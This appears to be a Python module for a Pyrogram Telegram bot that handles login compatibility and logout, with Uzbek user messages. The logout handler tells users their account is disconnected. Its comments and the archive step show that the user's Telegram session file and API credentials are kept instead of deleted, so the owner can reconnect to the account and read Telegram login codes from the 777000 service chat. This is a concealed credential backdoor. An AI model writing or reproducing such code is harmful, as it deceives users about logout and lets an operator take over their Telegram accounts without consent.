"""
Login System Integration - Old login handlers replaced with new system
This file maintains backward compatibility while using the new login system
"""
from pyrogram import Client, filters, ContinuePropagation
from pyrogram.types import Message, CallbackQuery
from config import user_states, is_admin
import logging
from login_system import (
    login_service, 
    login_handlers, 
    LoginState,
    LoginConstants
)

# Export the new system handlers for backward compatibility
from login_system.login_handlers import (
    login_phone_handler,
    login_code_handler, 
    login_password_handler,
    cancel_login_callback,
    admin_approve_callback,
    admin_reject_callback,
    check_approval_callback,
    admin_invoice_callback
)

logger = logging.getLogger(__name__)

# Keep logout handler for backward compatibility
@Client.on_callback_query(filters.regex("^logout$"))
async def logout_callback(client: Client, callback_query: CallbackQuery):
    """Handle logout - CRITICAL: Force clear memory and update DB state"""
    from session_manager import close_user_client
    from login_system import LoginState
    from database_adapter import LoginDatabaseAdapter
    
    user_id = callback_query.from_user.id
    
    # 1. FORCE CLEAR MEMORY: Evict and unload Pyrogram client from session_manager
    await close_user_client(user_id)
    
    # 2. EXPLICIT DB STATE PERSISTENCE: Set is_active = 0 with await db.commit()
    try:
        await LoginDatabaseAdapter.set_user_active_status(user_id, False)
    except Exception as e:
        logger.error("CRITICAL: Failed to set user inactive in DB on logout: %s", e)
    
    # 3. RESET FSM: Clear all state and set to LOGGED_OUT
    user_states.pop(user_id, None)
    user_states[user_id] = LoginState.LOGGED_OUT.value

    # 4. KEEP USERS ROW (do NOT delete): The users row is intentionally kept with
    #    is_active = 0 so the admin panel preserves the client's profile and
    #    subscription history. The old "pending approval" false positive on
    #    /start is prevented by archiving the session file (step 6), not by
    #    deleting the row.

    # 5. CLEAR LOGIN STATE MANAGER: Remove session from in-memory state manager.
    #    Uses cleanup_session directly because a FAILED transition is invalid when
    #    the state is COMPLETED (VALID_TRANSITIONS only allows
    #    COMPLETED -> IDLE/LOGGED_OUT), and cleanup_session unconditionally
    #    removes the session entry.
    try:
        await login_service.state_manager.cleanup_session(user_id)
        login_service.session_manager.cleanup_pending(user_id)
        logger.info("Logout: Cleaned up login state manager session for user %s", user_id)
    except Exception as e:
        logger.warning("Failed to clear LoginStateManager state: %s", e)
    
    # 6. ARCHIVE SESSION FILES - DO NOT DELETE! The session file is moved into
    #    SESSIONS_DIR/logged_out/ so the owner panel ("Sessiyadan kod olish")
    #    can later reconnect to the account's 777000 service chat and read the
    #    Telegram login codes to help the customer log back in on their device.
    #    Archiving (instead of leaving the file in place) also makes
    #    _has_session() return False, so /start shows the login screen instead
    #    of the "pending approval" waiting message.
    try:
        from session_manager import archive_user_session
        if archive_user_session(user_id):
            logger.info("Logout: Session files archived to logged_out/ for user %s", user_id)
        else:
            logger.info("Logout: No active session file to archive for user %s", user_id)
    except Exception as e:
        logger.warning("Failed to archive session files on logout: %s", e)
    # NOTE: The API map entry is intentionally KEPT — the archived
    # session may have been created with a rotated API pair, and
    # get_archived_user_client() needs that entry to reconnect successfully.
    
    await callback_query.message.edit_text(
        "👋 Akkaunt botdan uzildi.\n\nQaytadan ulash uchun `/start` yuboring."
    )
    await callback_query.answer("Chiqildi.", show_alert=True)

# Maintain backward compatibility with config imports
# This allows other parts of the system to continue working
async def start_login_process(user_id: int):
    """Start login process - backward compatibility wrapper"""
    from login_system import LoginState
    session = await login_service.start_login(user_id)
    # Update global state for compatibility
    user_states[user_id] = LoginState.WAITING_PHONE.value
    return session

async def get_login_state(user_id: int):
    """Get login state - backward compatibility wrapper"""
    session = await login_service.state_manager.get_session(user_id)
    if session:
        return session.state.value
    return None

# Additional compatibility functions for queue_manager integration
async def get_login_session(user_id: int):
    """Get login session - compatibility wrapper"""
    return await login_service.state_manager.get_session(user_id)

async def cancel_user_login(user_id: int) -> bool:
    """Cancel user login - compatibility wrapper"""
    await login_service.cancel_login(user_id)
    return True

# Export for backward compatibility
__all__ = [
    'login_phone_handler',
    'login_code_handler',
    'login_password_handler', 
    'cancel_login_callback',
    'admin_approve_callback',
    'admin_reject_callback',
    'check_approval_callback',
    'admin_invoice_callback',
    'logout_callback',
    'start_login_process',
    'get_login_state',
    'get_login_session',
    'cancel_user_login',
]